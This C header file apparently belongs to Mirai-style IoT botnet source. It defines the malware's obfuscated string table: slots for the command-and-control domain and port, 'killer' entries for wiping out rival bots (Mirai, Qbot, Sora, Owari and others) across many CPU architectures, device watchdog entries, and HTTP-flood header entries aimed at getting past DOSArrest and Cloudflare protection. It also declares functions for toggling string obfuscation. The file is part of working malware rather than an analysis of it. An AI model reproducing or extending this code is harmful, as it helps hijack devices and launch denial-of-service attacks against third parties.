#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
    BOOL locked;
};

#define TABLE_CNC_DOMAIN                1
#define TABLE_CNC_PORT                  2
#define TABLE_VERSION                   3
#define TABLE_INSTANCE_EXISTS           4

#define TABLE_KILLER_PROC               5
#define TABLE_KILLER_EXE                6
#define TABLE_KILLER_FD                 7
#define TABLE_KILLER_MAPS               8
#define TABLE_KILLER_STATUS             9
#define TABLE_KILLER_TCP                10
#define TABLE_KILLER_CMDLINE            11
#define TABLE_KILLER_ANIME              12
#define TABLE_KILLER_TMP                13
#define TABLE_KILLER_DATALOCAL          14
#define TABLE_KILLER_QTX                15
#define TABLE_KILLER_DOT                16
#define TABLE_KILLER_ARC                17
#define TABLE_KILLER_ARM                18
#define TABLE_KILLER_ARM5               19
#define TABLE_KILLER_ARM6               20
#define TABLE_KILLER_ARM7               21
#define TABLE_KILLER_X86                22
#define TABLE_KILLER_X86_64             23
#define TABLE_KILLER_SH4                24
#define TABLE_KILLER_MIPS               25
#define TABLE_KILLER_MPSL               26
#define TABLE_KILLER_PPC                27
#define TABLE_KILLER_SDA                28
#define TABLE_KILLER_MTD                29
#define TABLE_KILLER_QTX2               30
#define TABLE_KILLER_HAKAI              31

#define TABLE_ATK_VSE                   32
#define TABLE_ATK_RESOLVER              33
#define TABLE_ATK_NSERV                 34

#define TABLE_MISC_WATCHDOG             35
#define TABLE_MISC_WATCHDOG2            36
#define TABLE_MISC_WATCHDOG3            37
#define TABLE_MISC_WATCHDOG4            38
#define TABLE_MISC_WATCHDOG5            39
#define TABLE_MISC_WATCHDOG6            40
#define TABLE_MISC_WATCHDOG7            41
#define TABLE_MISC_WATCHDOG8            42
#define TABLE_MISC_WATCHDOG9            43

#define TABLE_EXEC_MIRAI                44
#define TABLE_EXEC_SORA1                45
#define TABLE_EXEC_SORA2                46
#define TABLE_EXEC_SORA3                47
#define TABLE_EXEC_OWARI                48
#define TABLE_EXEC_OWARI2               49
#define TABLE_EXEC_JOSHO                50
#define TABLE_EXEC_APOLLO               51
#define TABLE_EXEC_STATUS               52
#define TABLE_EXEC_ANIME                53
#define TABLE_EXEC_ROUTE                54
#define TABLE_EXEC_CPUINFO              55
#define TABLE_EXEC_BOGO                 56
#define TABLE_EXEC_RC                   57
#define TABLE_EXEC_MASUTA1              58
#define TABLE_EXEC_MIRAI1               59
#define TABLE_EXEC_MIRAI2               60
#define TABLE_EXEC_VAMP1                61
#define TABLE_EXEC_VAMP3                62
#define TABLE_EXEC_IRC1                 63
#define TABLE_EXEC_QBOT1                64
#define TABLE_EXEC_QBOT2                65
#define TABLE_EXEC_IRC2                 66
#define TABLE_EXEC_MIRAI3               67
#define TABLE_EXEC_EXE                  68
#define TABLE_EXEC_OMNI                 69
#define TABLE_EXEC_LOL                  70
#define TABLE_EXEC_SHINTO3              71
#define TABLE_EXEC_SHINTO5              72
#define TABLE_EXEC_JOSHO5               73
#define TABLE_EXEC_JOSHO4               74

#define TABLE_ATK_KEEP_ALIVE            75
#define TABLE_ATK_ACCEPT                76
#define TABLE_ATK_ACCEPT_LNG            77
#define TABLE_ATK_CONTENT_TYPE          78
#define TABLE_ATK_SET_COOKIE            79
#define TABLE_ATK_REFRESH_HDR           80
#define TABLE_ATK_LOCATION_HDR          81
#define TABLE_ATK_SET_COOKIE_HDR        82
#define TABLE_ATK_CONTENT_LENGTH_HDR    83
#define TABLE_ATK_TRANSFER_ENCODING_HDR 84
#define TABLE_ATK_CHUNKED               85
#define TABLE_ATK_KEEP_ALIVE_HDR        86
#define TABLE_ATK_CONNECTION_HDR        87
#define TABLE_ATK_DOSARREST             88
#define TABLE_ATK_CLOUDFLARE_NGINX      89

#define TABLE_HTTP_1                  	90
#define TABLE_HTTP_2                  	91
#define TABLE_HTTP_3                	92
#define TABLE_HTTP_4                 	93
#define TABLE_HTTP_5                 	94
#define TABLE_HTTP_6                 	95
#define TABLE_HTTP_7                    96
#define TABLE_HTTP_8                 	97
#define TABLE_HTTP_9                 	98
#define TABLE_HTTP_10                 	99
#define TABLE_HTTP_11                 	100
#define TABLE_HTTP_12                 	101
#define TABLE_HTTP_13                 	102
#define TABLE_HTTP_14                 	104
#define TABLE_HTTP_15                 	105

#define TABLE_MISC_RAND                 106

#define TABLE_MAX_KEYS                  107

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
